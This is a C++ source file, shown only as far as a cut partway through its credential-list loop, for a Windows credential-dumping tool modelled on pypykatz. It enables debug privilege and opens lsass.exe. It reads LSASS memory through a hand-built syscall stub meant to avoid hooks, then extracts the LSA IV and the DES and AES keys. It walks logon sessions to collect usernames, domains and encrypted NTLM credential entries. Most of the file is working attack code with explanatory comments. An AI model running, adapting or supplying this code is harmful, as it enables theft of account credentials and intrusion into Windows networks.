#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string>
#include <Dbghelp.h>
#include <Psapi.h>
#include <stdio.h>
#include <bcrypt.h>

#pragma comment(lib,"Bcrypt.lib") 
#pragma comment(lib, "Dbghelp.lib")
#pragma comment(lib, "Advapi32.lib")

typedef
NTSTATUS
(NTAPI* fpNtReadVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID BaseAddress,
	PVOID Buffer,
	ULONG NumberOfBytesToRead,
	PULONG NumberOfBytesReaded
	);

fpNtReadVirtualMemory fNtReadVirtualMemory;
fpNtReadVirtualMemory orig_NtReadVirtualMemory;

VOID EnableDebugPriv()
{
	HANDLE hToken;
	LUID luid;
	TOKEN_PRIVILEGES tkp;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid);
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Luid = luid;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, false, &tkp, sizeof(tkp), NULL, NULL);
	CloseHandle(hToken);
}

DWORD GetProcByName(std::string& pname)
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry) == TRUE)
		while (Process32Next(snapshot, &entry) == TRUE)
		{
			char processName[1024];
			size_t convertedCharsCount;

			wcstombs_s(&convertedCharsCount, processName, entry.szExeFile, 1024);

			if (_stricmp(processName, pname.c_str()) == 0) {
				CloseHandle(snapshot);
				return  entry.th32ProcessID;
			}
		}

	CloseHandle(snapshot);
	return 0;
}

// function for finding a pattern in a bunch of memory
void* memmem(const void* haystack, size_t haystack_len,
	const void* const needle, const size_t needle_len)
{
	if (haystack == NULL) return NULL; // or assert(haystack != NULL);
	if (haystack_len == 0) return NULL;
	if (needle == NULL) return NULL; // or assert(needle != NULL);
	if (needle_len == 0) return NULL;

	DWORDLONG offset = 0;
	for (const char* h = (const char*)haystack;
		haystack_len >= needle_len;
		++h, --haystack_len, ++offset) {
		if (!memcmp(h, needle, needle_len)) {
			//return offset;
			return (void*)h;
		}
	}
	return NULL;
}

void hexprint(void* b, int len)
{
	for (int i = 0; i < len; ++i) {
		printf("\\x%02hhx", *(unsigned char*)((DWORDLONG)b + i));
	}
	printf("\n");
}

int main()
{
	// First activity is to get the encryption keys and Initialization Vector (IV)
	printf("Phase1: Find encryption keys and Initialization Vector\n");
	printf("======================================================\n");

	const char* name = "lsass.exe";

	// Set Debug privileges
	EnableDebugPriv(); 
	printf("[+] debug privileges obtained\n");
	
	// Get PID 
	std::string n = std::string(name);
	DWORD pid = GetProcByName(n);
	printf("[+] %s pid: %d\n", name, pid);

	// Get a privileged handle to the process
	const DWORD dwOpenProcFlags = PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION;

	HANDLE hProcHandle = OpenProcess(dwOpenProcFlags, FALSE, pid);
	
	if (!hProcHandle) {
		printf("[!] Could not open a handle to %s: %d\n", name, GetLastError());
		return 1;
	}
	printf("[+] handle to %s: %d\n", name, hProcHandle);

	// Get amount of modules loaded
	DWORD modulesBytes = 0;
	HMODULE* modules = (HMODULE*)malloc(0);

	if (EnumProcessModules(hProcHandle, modules, 0, &modulesBytes) == 0) {
		printf("[!] EnumProcessModules failed: %d\n", GetLastError());
		return 1;
	}

	int numOfModules = modulesBytes / sizeof(HMODULE);

	printf("[+] %s has %lu loaded modules (%lu bytes)\n", name, numOfModules, modulesBytes);

	// Allocate memory for the modules
	modules = (HMODULE*)realloc(modules, modulesBytes);

	// Get the loaded modules into said memory
	if (EnumProcessModules(hProcHandle, modules, modulesBytes, &modulesBytes) == 0) {
		printf("[!] EnumProcessModules failed: %d\n", GetLastError());
		return 1;
	}

	void* lsasrvBaseAddress = NULL;
	DWORD lsasrvSize = 0;

	for (int i = 0; i < numOfModules; i++) {
		HMODULE mod = modules[i];

		DWORD GetModuleFileNameExA(
			HANDLE  hProcess,
			HMODULE hModule,
			LPSTR   lpFilename,
			DWORD   nSize
		);

		char moduleName[MAX_PATH];
		DWORD len = GetModuleFileNameExA(hProcHandle, mod, moduleName, MAX_PATH);

		if (len == 0) {
			printf("[!] GetModuleFileNameExA failed: %d\n", GetLastError());
			return 1;
		}

		// check if the module is lsasrv.dll
		if (strstr(moduleName, "lsasrv.dll") != NULL) {
			MODULEINFO modinfo;

			if (!GetModuleInformation(hProcHandle, mod, &modinfo, sizeof(modinfo))) {
				printf("[!] GetModuleInformation failed: %d\n", GetLastError());
				return 1;
			}

			printf("[+] lsasrv.dll found at %p size: %ld\n", modinfo.lpBaseOfDll, modinfo.SizeOfImage);
			lsasrvBaseAddress = modinfo.lpBaseOfDll;
			lsasrvSize = modinfo.SizeOfImage;
			break;
		}
	}
	free(modules);

	if (lsasrvBaseAddress == NULL) {
		printf("[!] Something broke - couldn't find baseAddress of lsasrv.dll\n");
		return 1;
	}

	/*
	Static code analysis of ntdll.dll using Ghidra on win10 build 18363:

	                         **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined NtReadVirtualMemory()
             undefined         AL:1           <RETURN>
                             0x9c840  526  NtReadVirtualMemory
                             0x9c840  2065  ZwReadVirtualMemory
                             ZwReadVirtualMemory                             XREF[14]:    Entry Point(*), 
                             Ordinal_2065                                                 RtlWow64GetSharedInfoProcess:180
                             Ordinal_526                                                  RtlQueryProcessDebugInformation:
                             NtReadVirtualMemory                                          RtlQueryCriticalSectionOwner:180
                                                                                          1800f0bfa(c), 
                                                                                          PssNtFreeRemoteSnapshot:18011090
                                                                                          1801118cf(c), 1801119cf(c), 
                                                                                          180111a0b(c), 180113c5b(c), 
                                                                                          18011402d(c), 18011afd6(*), 
                                                                                          18014cd40(*), 18014e54c(*)  
       18009c840 4c 8b d1        MOV        R10,RCX
       18009c843 b8 3f 00        MOV        EAX,0x3f
                 00 00
       18009c848 f6 04 25        TEST       byte ptr [DAT_7ffe0308],0x1
                 08 03 fe 
                 7f 01
       18009c850 75 03           JNZ        LAB_18009c855
       18009c852 0f 05           SYSCALL
       18009c854 c3              RET
	*/

	// Opcodes of NtReadVirtualMemory
	unsigned char opcodes[] =
		"\x4c\x8b\xd1\xb8\x3f\x00\x00\x00\xf6\x04\x25\x08\x03\xfe\x7f\x01\x75\x03\x0f\x05\xc3";

	// allocate executable memory for opcodes
	void* executableMemory = VirtualAlloc(0, sizeof opcodes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	// move opcodes over from stack to executable memory
	memcpy(executableMemory, opcodes, sizeof opcodes);

	// make a real function pointer to the memory containing opcodes, such that we can actually call it
	fpNtReadVirtualMemory NtReadVirtualMemory = reinterpret_cast<fpNtReadVirtualMemory>(executableMemory);


	// Allocate some memory to hold the memory dump of target process
	void *buffer = malloc(lsasrvSize);

	// clear buffer
	memset(buffer, 0, lsasrvSize);

	// Reading memory
	LONGLONG bytesRead = 0;
	NTSTATUS status = NtReadVirtualMemory(hProcHandle, lsasrvBaseAddress, buffer, lsasrvSize, (LPDWORD)&bytesRead);

	if (status != 0) {
		printf("[!]   NtReadVirtualMemory of %p failed: %X\n", lsasrvBaseAddress, status);
	}

	printf("[+] NtReadVirtualMemory successfully read memory from lsasrv.dll module: %lu bytes\n", bytesRead);
	
	// Win10 x64 only ( https://github.com/skelsec/pypykatz/blob/master/pypykatz/lsadecryptor/lsa_template_nt6.py#L399 )
	const void * pattern = (const void*)"\x83\x64\x24\x30\x00\x48\x8d\x45\xe0\x44\x8b\x4d\xd8\x48\x8d\x15";

	/*
	   This is the pattern from lsasrv.dll's code that is part of the LsaInitializeProtectedMemory function, responsible
	   for generating encryption keys at LSASS startup, to be used to encrypt secrets while in memory. That's why we use
	   this pattern to find the keys in memory, as the keys are located close in memory to this pattern at runtime.

	   ( for better explanation, check out https://blog.xpnsec.com/exploring-mimikatz-part-1/ )

	   Ghidra output:

       18005f236 83 64 24        AND        dword ptr [RSP + 0x30],0x0
                 30 00
       18005f23b 48 8d 45 e0     LEA        RAX,[RBP + -0x20]
       18005f23f 44 8b 4d d8     MOV        R9D,dword ptr [RBP + -0x28]
       18005f243 48 8d 15        LEA        RDX,[0x1801885b8]
	*/
      
	// Find the address where the pattern resides
	void* patternPtr = memmem(buffer, (size_t)bytesRead, pattern, 16);
	
	// check if shit went south
	if (patternPtr == NULL) {
		printf("[!] Search for pattern in lsasrv.dll module memory came up empty, or something else messed up in memmem()\n");
		return 1;
	}

	printf("[+] pattern found at: %p (in my own copy of LSASS' memory)\n", patternPtr);
	printf("[+] pattern: ");
	hexprint(patternPtr, 16);

	// from https://github.com/skelsec/pypykatz/blob/master/pypykatz/lsadecryptor/lsa_template_nt6.py#L401
	// this is an offset, to an offset that LSASS has in memory.
	DWORDLONG IVOffsetOffset = 67;
	
	// here's a pointer that points to LSASS' offset in memory:
	char* offsetToIVIsAtThisAddress = (char*)((DWORDLONG)patternPtr + IVOffsetOffset);
	printf("[+] address of offset to IV: %p\n", offsetToIVIsAtThisAddress);

	// Now we use that pointer to parse the memory (4 bytes) into a unsigned 32-bit integer
	uint32_t offsetToIV = *(uint32_t*)offsetToIVIsAtThisAddress;
	printf("[+] offset to IV: %zu\n", offsetToIV);

	// Now that we have interpreted LSASS' offset into a number, we can actually compute the real address
	// of the IV, and make that into a pointer we can use to read the actual value
	char* IVptr = (char*)((DWORDLONG)offsetToIVIsAtThisAddress + 4 + offsetToIV);
	printf("[+] IV should be at this address: (offsetAddress + 4 + offset): %p\n", IVptr);

	// and now we read the actual value
	printf("[+] IV: ");
	hexprint(IVptr, 16);

	/*  To conclude, it's like this:
	    +-------+                        +------+                    +--+
        |PATTERN| +----67 bytes--------> |OFFSET| +---offset-------> |IV|
        +-------+                        +------+                    +--+
	*/

	// Now we do all of this all over + even more complex stuff to get the DES key

	// from https://github.com/skelsec/pypykatz/blob/master/pypykatz/lsadecryptor/lsa_template_nt6.py#L402
	// this is an offset, to an offset that LSASS has in memory
	DWORDLONG DESkeyOffsetOffsetOffset = -89;

	// here's a pointer that points to LSASS' offset in memory:
	char* offsetToDESkeyOffsetIsAtThisAddress = (char*)((DWORDLONG)patternPtr + DESkeyOffsetOffsetOffset);
	printf("[+] address of offset to DES key offset: %p\n", offsetToDESkeyOffsetIsAtThisAddress);

	// Now we use that pointer to parse the memory (4 bytes) into a signed 32-bit integer
	// https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/commons/readers/local/live_reader.py#L284
	int32_t offsetToDESkeyOffset = *(int32_t*)offsetToDESkeyOffsetIsAtThisAddress;
	printf("[+] offset to DES key offset: %zu\n", offsetToDESkeyOffset);

	// Now that we have interpreted LSASS' offset into a number, we can actually compute the real address
	// of the DES key, and make that into a pointer we can use to read the actual value
	char* DESkeyOffsetIsAtThisAddress = (char*)((DWORDLONG)offsetToDESkeyOffsetIsAtThisAddress + 4 + offsetToDESkeyOffset);
	printf("[+] DES key offset should be at this address: (offsetAddress + 4 + offset): %p\n", IVptr);
	printf("[+] bytes that should be interpreted as uint64_t: ");
	hexprint(DESkeyOffsetIsAtThisAddress, 8);

	// Now we use that pointer to parse the memory (8 bytes) into a unsigned 64-bit integer
	// https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/commons/readers/local/live_reader.py#L223
	uint64_t absoluteAddressOfKBHKstruct = *(uint64_t*)DESkeyOffsetIsAtThisAddress;
	printf("[+] uint64_t: %llu\n", absoluteAddressOfKBHKstruct);
	//printf("x: %llu\n", x);

	char* absolutePointerToKBHKstruct = (char*)absoluteAddressOfKBHKstruct;
	
	// So, this pointer is an absolute pointer in the virtual address space of LSASS

	// Let's read 0x200 bytes to be on the safe side that we get enough																		
	size_t bytesToRead = 0x200;

	// Allocate some memory to hold the memory dump of target process
	void* buffer2 = malloc(bytesToRead);

	// clear buffer
	memset(buffer2, 0, bytesToRead);

	// Reading memory
	LONGLONG bytesRead2 = 0;
	status = NtReadVirtualMemory(hProcHandle, (void*)absolutePointerToKBHKstruct, buffer2, bytesToRead, (LPDWORD)&bytesRead2);

	if (status != 0) {
		printf("[!] NtReadVirtualMemory of %p failed: %X\n", absolutePointerToKBHKstruct, status);
		return 1;
	}

	printf("[+] NtReadVirtualMemory successfully read Struct memory that holds DES key: %lu bytes\n", bytesRead2);
	//hexprint(buffer2, bytesRead2);
	
	/*
	The KBHK struct holds a struct, that holds the size of the DES key, and the actual DES key itself.
	The offset to the size (uint32_t) is apparently 88 bytes (check the links below), and the key itself is right next to it.

	https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/lsadecryptor/lsa_decryptor_nt6.py#L63
	https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/lsadecryptor/lsa_template_nt6.py#L318
	https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/lsadecryptor/lsa_template_nt6.py#L263
	https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/lsadecryptor/lsa_template_nt6.py#L258
	*/

	void* DESkeySizeAddr = (void*)((char*)buffer2 + 88);
	void* DESkeyDataAddr = (void*)((char*)DESkeySizeAddr + 4);

	uint32_t DESkeyLength = *(uint32_t*)DESkeySizeAddr;
	printf("[+] size of DES key: %u\n", DESkeyLength);
	printf("[+] DES key: ");
	hexprint(DESkeyDataAddr, (int)DESkeyLength);
	

	// Now we get the AES key - lucky for us, the way we get the AES key is pretty much the exact same as we got DES

	// Offset is from https://github.com/skelsec/pypykatz/blob/master/pypykatz/lsadecryptor/lsa_template_nt6.py#L403
	DWORDLONG AESkeyOffsetOffsetOffset = 16;

	// here's a pointer that points to LSASS' offset in memory:
	char* offsetToAESkeyOffsetIsAtThisAddress = (char*)((DWORDLONG)patternPtr + AESkeyOffsetOffsetOffset);
	printf("[+] address of offset to AES key offset: %p\n", offsetToAESkeyOffsetIsAtThisAddress);

	// Now we use that pointer to parse the memory (4 bytes) into a signed 32-bit integer
	// https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/commons/readers/local/live_reader.py#L284
	int32_t offsetToAESkeyOffset = *(int32_t*)offsetToAESkeyOffsetIsAtThisAddress;
	printf("[+] offset to AES key offset: %zu\n", offsetToAESkeyOffset);

	// Now that we have interpreted LSASS' offset into a number, we can actually compute the real address
	// of the DES key, and make that into a pointer we can use to read the actual value
	char* AESkeyOffsetIsAtThisAddress = (char*)((DWORDLONG)offsetToAESkeyOffsetIsAtThisAddress + 4 + offsetToAESkeyOffset);
	printf("[+] AES key offset should be at this address: (offsetAddress + 4 + offset): %p\n", IVptr);
	printf("[+] bytes that should be interpreted as uint64_t: ");
	hexprint(AESkeyOffsetIsAtThisAddress, 8);

	// Now we use that pointer to parse the memory (8 bytes) into a unsigned 64-bit integer
	// https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/commons/readers/local/live_reader.py#L223
	absoluteAddressOfKBHKstruct = *(uint64_t*)AESkeyOffsetIsAtThisAddress;
	printf("[+] uint64_t: %llu\n", absoluteAddressOfKBHKstruct);
	//printf("x: %llu\n", x);

	absolutePointerToKBHKstruct = (char*)absoluteAddressOfKBHKstruct;

	// So, this pointer is an absolute pointer in the virtual address space of LSASS

	// Let's read 0x200 (512) bytes to be on the safe side that we get enough																		
	bytesToRead = 0x200;

	// Allocate some memory to hold the memory dump of target process
	void* buffer3 = malloc(bytesToRead);

	// clear buffer
	memset(buffer3, 0, bytesToRead);

	// Reading memory
	LONGLONG bytesRead3 = 0;
	status = NtReadVirtualMemory(hProcHandle, (void*)absolutePointerToKBHKstruct, buffer3, bytesToRead, (LPDWORD)&bytesRead3);

	if (status != 0) {
		printf("[!] NtReadVirtualMemory of %p failed: %X\n", absolutePointerToKBHKstruct, status);
		return 1;
	}

	printf("[+] NtReadVirtualMemory successfully read memory that holds AES key: %lu bytes\n", bytesRead3);
	//hexprint(buffer2, bytesRead3);

	/*
	the explanation for the following code is the same as earlier, when we got the DES key
	*/

	void* AESkeySizeAddr = (void*)((char*)buffer3 + 88);
	void* AESkeyDataAddr = (void*)((char*)AESkeySizeAddr + 4);

	uint32_t AESkeyLength = *(uint32_t*)AESkeySizeAddr;
	printf("[+] size of AES key: %u\n", AESkeyLength);
	printf("[+] AES key: ");
	hexprint(AESkeyDataAddr, (int)AESkeyLength);

	// Now that we have the encryption keys, we can start searching for the logonsessions, such that we can
	// get those sweet NTLM hashes
	printf("\nPhase2: Looking for NTLM hashes in logonsessions!\n");
	printf("=================================================\n");

	

	// Firsty, we want to get the count of logonsessions
	
	// MSV pattern: https://github.com/skelsec/pypykatz/blob/3399f7905951404206eac916f2e653f49241b60c/pypykatz/lsadecryptor/packages/msv/templates.py#L123
	const void* msvPattern = (const void*)"\x33\xff\x41\x89\x37\x4c\x8b\xf3\x45\x85\xc0\x74";


	/* ghidra output from lsasrv.dll where pattern is:
	
	                             LAB_18006d514                                   XREF[1]:     1800bcd71(j)  
       18006d514 33 ff           XOR        EDI,EDI
       18006d516 41 89 37        MOV        dword ptr [R15],ESI
       18006d519 4c 8b f3        MOV        R14,RBX
       18006d51c 45 85 c0        TEST       R8D,R8D
       18006d51f 74 53           JZ         LAB_18006d574
       18006d521 48 8d 35        LEA        RSI,[DAT_180189530]                              = ??
                 08 c0 11 00

	*/

	// Find the address where the pattern resides
	// (note that "buffer" still is just a pointer to the data we read earlier. Scroll up if in doubt.
	// (note that the bytesRead variable here tells memmem how much data we should search in. It's from when we read the "buffer" data)
	void* msvPatternPtr = memmem(buffer, (size_t)bytesRead, msvPattern, 12);

	// check if shit went south
	if (msvPatternPtr == NULL) {
		printf("[!] Search for pattern in lsasrv.dll module memory came up empty, or something else messed up in memmem()\n");
		return 1;
	}

	printf("[+] MSV pattern found at: %p (in my own copy of LSASS' memory)\n", msvPatternPtr);
	printf("[+] MSV pattern: ");
	hexprint(msvPatternPtr, 12);

	// offset https://github.com/skelsec/pypykatz/blob/3399f7905951404206eac916f2e653f49241b60c/pypykatz/lsadecryptor/packages/msv/templates.py#L125
	DWORDLONG LogonSessionCountOffset = -4;

	char* logonSessionCountPointer = (char*)((DWORDLONG)msvPatternPtr + LogonSessionCountOffset);
	printf("[+] logon session pointer is : %p (MSV pattern pointer + offset: %p + %d)\n", logonSessionCountPointer, msvPatternPtr, LogonSessionCountOffset);
	
	// Now we use that pointer to parse the memory (4 bytes) into a signed 32-bit integer
	// https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/commons/readers/local/live_reader.py#L284
	int32_t logonSessionCountOffset = *(int32_t*)logonSessionCountPointer;
	printf("[+] offset to logonSessionCount: %zu\n", logonSessionCountOffset);

	// Now that we have interpreted LSASS' offset into a number, we can actually compute the real address
	// of the count, and make that into a pointer we can use to read the actual value
	char* LogonSessionCountIsAtThisAddress = (char*)((DWORDLONG)logonSessionCountPointer + 4 + logonSessionCountOffset);
	printf("[+] logonSessionCount should be at this address: (address + 4 + offset): %p\n", LogonSessionCountIsAtThisAddress);
	printf("[+] bytes that should be interpreted as uint8_t: ");
	hexprint(LogonSessionCountIsAtThisAddress, 1);

	// Now we use that pointer to parse the memory (1 byte) into a unsigned 8-bit integer
	// https://github.com/skelsec/pypykatz/blob/master/pypykatz/lsadecryptor/packages/msv/decryptor.py#L269
	uint8_t logonSessionCount = *(uint8_t*)LogonSessionCountIsAtThisAddress;
	printf("[+] uint8_t: %u\n", logonSessionCount);
	printf("    ..meaning we have %u logonsessions to go through.\n", logonSessionCount);

	// Apparrently, the first logon session is always at an offset:
	// https://github.com/skelsec/pypykatz/blob/3399f7905951404206eac916f2e653f49241b60c/pypykatz/lsadecryptor/packages/msv/templates.py#L124
	DWORDLONG firstLogonSessionOffsetOffset = 23;

	char* firstLogonSessionOffsetPointer = (char*)((DWORDLONG)msvPatternPtr + firstLogonSessionOffsetOffset);
	printf("[+] first logon session offset is: %p (MSV pattern pointer + firstLogonSessionOffset: %p + %d)\n", logonSessionCountPointer, msvPatternPtr, firstLogonSessionOffsetOffset);


	// Now we use that pointer to parse the memory (4 bytes) into a signed 32-bit integer
	// https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/commons/readers/local/live_reader.py#L284
	int32_t firstLogonSessionOffset = *(int32_t*)firstLogonSessionOffsetPointer;
	printf("[+] offset to first logon session: %zu\n", firstLogonSessionOffset);

	// firstLogonSessionIsAtThisAddress 
	char* ptr_entry_loc = (char*)((DWORDLONG)firstLogonSessionOffsetPointer + 4 + firstLogonSessionOffset);
	printf("[+] logonSession should be at this address: (address + 4 + offset): %p\n", LogonSessionCountIsAtThisAddress);
	//printf("[+] bytes at logonSession: ");
	//hexprint(ptr_entry_loc, 8);
	//printf("\n");

	// Now we use that pointer to parse the memory (8 bytes) into a unsigned 64-bit integer
	// https://github.com/skelsec/pypykatz/blob/39d8b06861d9ccd615e8107707f56f6556fb15a0/pypykatz/commons/readers/local/live_reader.py#L223
	uint64_t ptr_entry = *(uint64_t*)ptr_entry_loc;
	printf("[+] uint64_t: %llu\n", ptr_entry);
	


	// Now, let's look at each logon session
	uint64_t entry_ptr_value = ptr_entry;
	char* entry_ptr_loc = ptr_entry_loc;

	char* pos;
	for (int logonSessionIndex = 0; logonSessionIndex < (int)logonSessionCount; logonSessionIndex++)
	{
		printf("[+] Looking at logonsession #%d\n", logonSessionIndex);
		pos = ptr_entry_loc;

		// "skipping offset"
		// https://github.com/skelsec/pypykatz/blob/4bdf4333130c9c2295ef5abcb548caed1aa06b39/pypykatz/lsadecryptor/packages/msv/decryptor.py#L363
		for (int x = 0; x < logonSessionIndex * 2; x++)
		{
			printf("[+] incrementing \"head\"/pointer/pos thingie by 8...");
			pos = (char*)((DWORDLONG)pos + 8);
		}

		char* location = pos;
		char* firstLocation = location;


		uint64_t value = *(uint64_t*)location;
		uint64_t firstEntry = value;

		printf("    Now we have a logon session entry pointer\n");
		printf("    The pointer to the logon session points to this address: %p\n", location);
		printf("    If we read 8 bytes at that address, and interpret them as an unsigned number, that number is: %llu\n", value);
		printf("    ... take that number, and try to treat it like a pointer, that pointer is pointing to this address: %p\n", (char*)value);

		// if the logon session pointer is pointing to itself (meaning it's empty), skip it
		// https://github.com/skelsec/pypykatz/blob/4bdf4333130c9c2295ef5abcb548caed1aa06b39/pypykatz/lsadecryptor/packages/msv/decryptor.py#L369
		if (location == (char*)value)
		{
			printf("[!] logon session is empty. Skipping...\n");
			continue;
		}

		// The logon session is actually a linked list. so we have to iterate over that
		// https://github.com/skelsec/pypykatz/blob/3399f7905951404206eac916f2e653f49241b60c/pypykatz/lsadecryptor/package_commons.py#L151
		int maxLimit = 255;
		int iterations = 0;

		while (TRUE) // loop until we break
		{
			printf("\n  [+] Looking at entry %d in the logonsession's linked list\n", iterations);
			iterations++;
			if (iterations >= maxLimit)
			{
				printf("  [!] something is wrong. The logonsession linked list shouldn't have more than 255 entries! Exiting...\n");
				return 0;
			}

			if (value == 0)
			{
				printf("  [ ] Logon session entry pointer points to 0, so no more entries in linked list, i guess?\n");
				break;
			}

			pos = (char*)value;
			
			// Let's read 0x800 bytes
			bytesToRead = 0x800;

			// Allocate some memory to hold the memory dump of target process
			void* logonSessionBuffer = malloc(bytesToRead);

			// clear buffer
			memset(logonSessionBuffer, 0, bytesToRead);

			// Reading memory
			LONGLONG bytesRead4 = 0;
			status = NtReadVirtualMemory(hProcHandle, pos, logonSessionBuffer, bytesToRead, (LPDWORD)&bytesRead4);

			if (status != 0) {
				printf("  [!] NtReadVirtualMemory of %p failed: %X\n", pos, status);
				return 1;
			}

			printf("  [+] NtReadVirtualMemory successfully read Logon Session memory: %lu bytes\n", bytesRead4);
			
			uint64_t flink = *(uint64_t*)logonSessionBuffer;
			//printf("  [+] Flink: %llu\n", flink);

			
			// 144 is the distance between the flink and the username in the entry (calculated by debugging)
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 144);

			// The memory that buffer4 is point to now is actually a special kind of object.
			// First, there's a length, a maxlength, and then a pointer to a unicode string, that is actually
			// the username itself.
			uint16_t usernameLength = *(uint16_t*)logonSessionBuffer;

			// printf("length: %hu\n", usernameLength);
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 2);

			uint16_t usernameMaxLength = *(uint16_t*)logonSessionBuffer;
			//printf("maxLength: %hu\n", usernameMaxLength);
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 2);

			// there's an offset of 4, apparently
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 4);

			// interpret 8 bytes as unsigned number, and treat that number as a pointer to a char array
			// this is actually a unicode string that holds the username.
			uint64_t pointerToUsername = *(uint64_t*)logonSessionBuffer;
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 8);

			// Let's read 'length' bytes
			bytesToRead = usernameLength;

			// Allocate some memory to hold the memory dump of target process
			void* usernameBuffer = malloc(bytesToRead + 2);  // + 2 here since it's unicode (which takes up two bytes per characters, so trailing null should be two bytes as well)

			// clear buffer
			memset(usernameBuffer, 0, bytesToRead + 2);

			// Reading memory
			LONGLONG bytesRead5 = 0;
			status = NtReadVirtualMemory(hProcHandle, (char*)pointerToUsername, usernameBuffer, bytesToRead, (LPDWORD)&bytesRead5);

			if (status != 0) {
				printf("  [!] NtReadVirtualMemory of %p failed: %X\n", pos, status);
				return 1;
			}

			printf("  [+] NtReadVirtualMemory successfully read Username memory: %lu bytes\n", bytesRead5);


			// Some stuff for colors
			HANDLE  hConsole;
			hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
			
			SetConsoleTextAttribute(hConsole, 10); // set color to green
			wprintf(L"  [+] Username: %s\n", (wchar_t*)usernameBuffer);
			SetConsoleTextAttribute(hConsole, 7); // set color back to grey

			free(usernameBuffer);

			// Now that we have username, it's time to get the domain of the user, which is located right after the username.
			// https://github.com/skelsec/pypykatz/blob/4bdf4333130c9c2295ef5abcb548caed1aa06b39/pypykatz/lsadecryptor/packages/msv/templates.py#L572-L573 
			
			uint16_t domainLength = *(uint16_t*)logonSessionBuffer;

			//printf("  length: %hu\n", domainLength);
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 2);

			uint16_t domainMaxLength = *(uint16_t*)logonSessionBuffer;
			//printf("  maxLength: %hu\n", domainMaxLength);
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 2);

			// there's an offset of 4, to realign memory
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 4);

			// interpret 8 bytes as unsigned number, and treat that number as a pointer to a char array
			// this is actually a unicode string that holds the username.
			uint64_t pointerToDomain = *(uint64_t*)logonSessionBuffer;

			// Let's read 'length' bytes
			bytesToRead = domainLength;

			// Allocate some memory to hold the memory dump of target process
			void* domainBuffer = malloc(bytesToRead + 2); // + 2 here since it's unicode (which takes up two bytes per characters, so trailing null should be two bytes as well)

			// clear buffer
			memset(domainBuffer, 0, bytesToRead + 2);

			// Reading memory
			bytesRead5 = 0;

			status = NtReadVirtualMemory(hProcHandle, (char*)pointerToDomain, domainBuffer, bytesToRead, (LPDWORD)&bytesRead5);

			if (status != 0) {
				printf("  [!] NtReadVirtualMemory of %p failed: %X\n", pos, status);
				return 1;
			}

			printf("  [+] NtReadVirtualMemory successfully read Domain memory: %lu bytes\n", bytesRead5);

			SetConsoleTextAttribute(hConsole, 10); // set color to green
			wprintf(L"  [+] Domain: %s\n", (wchar_t*)domainBuffer);
			SetConsoleTextAttribute(hConsole, 7); // set color back to grey

			free(domainBuffer);
;

			// Next up, we need to get a hold of a pointer to a linked list of "credentials" (encrypted hashes)
			// The offset from the domain to the pointer is 96 bytes (again calculated by debugging)
			logonSessionBuffer = (char*)((DWORDLONG)logonSessionBuffer + 96);

			// here goes some linkedlistception. That is linked list within linked list

			// cl = Credential List
			char* clFirstEntry = (char*)(*(uint64_t*)logonSessionBuffer);
			
			if (clFirstEntry != NULL) {
				char* clEntry = clFirstEntry;
				
				do {
					printf("  [+] Iterating over clEntry: %llu\n", clEntry);

					// Let's read the bytes of the entry
					bytesToRead = 0x200;

					// Allocate some memory to hold the memory dump of target process
					void* clEntryBuffer = malloc(bytesToRead);  // + 2 here since it's unicode (which takes up two bytes per characters, so trailing null should be two bytes as well)

					// clear buffer
					memset(clEntryBuffer, 0, bytesToRead + 2);

					// Reading memory
					LONGLONG bytesRead6 = 0;
					status = NtReadVirtualMemory(hProcHandle, clEntry, clEntryBuffer, bytesToRead, (LPDWORD)&bytesRead6);

					if (status != 0) {
						printf("    [!] NtReadVirtualMemory of %p failed: %X\n", pos, status);
						return 1;
					}

					printf("    [+] NtReadVirtualMemory successfully read Credential List Entry memory: %lu bytes\n", bytesRead6);
					//hexprint(clEntryBuffer, 0x20);

					char* clEntryFlist = (char*)(*(uint64_t*)clEntryBuffer);
					clEntryBuffer = (char*)((DWORDLONG)clEntryBuffer + 8);
					//printf("    Flist: %llu\n", clEntryFlist);

					// We don't care about the authenticationPackageId, so let's skip it.
					//uint32_t AuthenticationPackageId = *(uint32_t*)clEntryBuffer;
					clEntryBuffer = (char*)((DWORDLONG)clEntryBuffer + 4);
					//printf("AuthenticationPackageId: %lu\n", AuthenticationPackageId);

					// then there's an offset of 4, because of alignment
					clEntryBuffer = (char*)((DWORDLONG)clEntryBuffer + 4);


